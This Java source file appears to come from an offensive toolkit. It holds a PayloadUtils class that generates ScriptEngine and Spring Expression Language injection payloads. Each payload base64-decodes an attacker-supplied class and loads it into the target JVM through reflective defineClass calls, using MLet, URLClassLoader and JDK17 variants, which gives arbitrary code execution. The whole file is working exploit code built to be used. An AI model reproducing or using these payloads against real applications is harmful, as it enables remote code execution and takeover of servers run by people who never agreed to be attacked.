package com.ppp.utils;

/**
 * @author Whoopsunix
 */
public class PayloadUtils {
    /**
     * ScriptEngine
     * @param b64
     * @param loaderClassName
     * @return
     */
    public static String script(String b64, String loaderClassName) {
        String code = String.format("data=\"%s\";bytes=\"\".getBytes();" +
                "try{bytes=java.util.Base64.getDecoder().decode(data);}catch(e){" +
                "aClass=java.lang.Class.forName(\"sun.misc.BASE64Decoder\");" +
                "object=aClass.newInstance();" +
                "bytes=aClass.getMethod(\"decodeBuffer\",java.lang.String.class).invoke(object,data);}" +
                "classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
                "try{" +
                "clazz=classLoader.loadClass(\"%s\");" +
                "clazz.newInstance();" +
                "}catch(err){" +
                "defineClassMethod=java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\",\"\".getBytes().getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);" +
                "defineClassMethod.setAccessible(true);" +
                "loadedClass=defineClassMethod.invoke(classLoader,bytes,0,bytes.length);" +
                "loadedClass.newInstance();" +
                "};", b64, loaderClassName);
        return code;
    }

    public static String spel1(String b64, String loaderClassName) {
        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',new sun.misc.BASE64Decoder().decodeBuffer('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}", loaderClassName, b64);
    }

    public static String spel(String b64, String loaderClassName) {
//        String spel = String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}", loaderClassName, b64);
//        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}", loaderClassName, b64);
        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}", loaderClassName, b64);
    }

    public static String spelJDK17(String b64, String loaderClassName) {
        // 正常
        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}", loaderClassName, b64);

        // urlClassLoader
//        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),new java.net.URLClassLoader(new java.net.URL[0], T(java.lang.Thread).currentThread().getContextClassLoader()), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}", loaderClassName, b64);

        // ClassLoader.getSystemClassLoader() 即 ClassLoader$AppClassLoader
//        return String.format("{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),T(java.lang.ClassLoader).getSystemClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}", loaderClassName, b64);
    }

    public static String spelLoadClass(String loaderClassName){
        return String.format("{T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('%s').newInstance()}", loaderClassName);
    }


}
